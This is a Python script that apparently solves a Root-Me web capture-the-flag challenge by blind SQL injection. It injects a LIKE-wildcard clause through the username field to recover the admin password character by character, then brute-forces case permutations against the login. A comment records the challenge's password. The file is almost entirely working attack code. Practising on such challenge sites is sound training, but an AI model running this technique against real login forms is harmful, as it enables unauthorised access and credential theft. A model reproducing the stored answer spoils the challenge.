import requests
import itertools


# accepts a unsername as parameter and finds the password (case insensitive)
# by looping through the alphabet to find the right character at the right index
# returns the password that is case insensitive
# assumes password length is 8
def find_pwd(uname):
    alpha_num = 'abcdefghijklmnopqrstuvwxyz0123456789'
    password = ""
    for i in range(1,9):
        for char in alpha_num:
            if req(uname, password + char):
                password += char
                break
    print("password (case insensitive) for " + uname + " is " + password)
    return password

# tests the password using post request with sql statement and wildcards
# return true if the input password matches
def req(uname, password):
    URL = "http://challenge01.root-me.org/web-serveur/ch10/"
    # concatenate the sql statement
    sql_statement = uname + "' AND password like '" + password + "%'--"
    # data passed to the post request
    data = {
        "username": sql_statement,
        "password": "aaa"
        }
    # post request
    response = requests.post(url=URL, data=data)
    # checks if the statement was successful by checking if the response
    # contains Welcome
    if "Welcome" in response.text:
        return True
    return False


# checks if a certain username and password combination exists
def check_credentials(uname, pwd):
    URL = "http://challenge01.root-me.org/web-serveur/ch10/"
    data = {
        "username": uname,
        "password": pwd
    }
    response = requests.post(url=URL, data=data)
    if "Welcome" in response.text:
        print("Credentials found!\nusername: " + uname + "\npassword: " + pwd)
        return True
    return False


# gets a list of all combinations of upper and lower case for a String
def get_case_permutations(word):
    permutations = map(''.join, itertools.product(*((c.upper(), c.lower()) for c in word)))
    return permutations


def find_cased_password(uname):
    pwd_list = get_case_permutations(find_pwd(uname))
    for pwd in pwd_list:
        if check_credentials(uname, pwd):
            return pwd

# "e2azo93i"
print("The password for admin is " + find_cased_password("admin"))
